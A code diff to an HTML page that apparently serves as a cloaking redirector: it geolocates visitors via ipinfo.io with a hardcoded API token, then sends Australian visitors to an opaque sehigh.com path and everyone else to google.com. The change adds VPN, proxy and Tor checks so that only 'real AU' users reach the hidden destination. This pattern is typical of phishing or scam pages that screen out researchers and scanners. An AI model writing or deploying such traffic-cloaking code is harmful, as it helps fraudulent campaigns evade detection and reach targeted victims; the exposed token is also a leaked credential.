@@ -1,31 +1,46 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>work</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js" integrity="sha512-cEgdeh0IWe1pUYypx4mYPjDxGB/tyIORwjxzKrnoxcif2ZxI7fw81pZWV0lGnPWLrfIHGA7qc964MnRjyCYmEQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirect</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
-    <script>
-        const allowedCountries = ['AU']; // غير الأستراليين يدخلوا
+  <script>
+    const allowedCountry = 'AU'; // Australia only
+    const token = "396ec7a7e34187"; // Token dyalek
 
-        $.get('https://ipinfo.io/json?token=396ec7a7e34187', function(data) {
-            const ipAddress = data.ip;
-            const country = data.country;
+    $.get(`https://ipinfo.io/json?token=${token}`, function(data) {
+      const ip = data.ip;
+      const country = data.country;
 
-            console.log("IP Address:", ipAddress);
-            console.log("Country:", country);
+      console.log("IP:", ip);
+      console.log("Country:", country);
 
-            if (allowedCountries.includes(country)) {
-                window.location.href = "https://www.sehigh.com/DZRZX6W/2151XQRW/";
-            } else {
-                window.location.href = "https://google.com";
-            }
-        }).fail(function(error) {
-            console.error('Error:', error);
-            window.location.href = "https://google.com"; // fallback حتى إلا فشل الطلب
-        });
-    </script>
+      // Check proxy or VPN using IPinfo privacy API
+      $.get(`https://ipinfo.io/${ip}/privacy?token=${token}`, function(privacyData) {
+        const isProxy = privacyData.proxy;
+        const isVPN = privacyData.vpn;
+        const isTor = privacyData.tor;
+
+        console.log("Proxy:", isProxy);
+        console.log("VPN:", isVPN);
+        console.log("Tor:", isTor);
+
+        if (country === allowedCountry && !isProxy && !isVPN && !isTor) {
+          // Real AU user
+          window.location.href = "https://www.sehigh.com/DZRZX6W/2151XQRW/";
+        } else {
+          // Not allowed
+          window.location.href = "https://google.com";
+        }
+      });
+
+    }).fail(function(err) {
+      console.error("IP check failed:", err);
+      window.location.href = "https://google.com";
+    });
+  </script>
 </head>
 <body>
 </body>
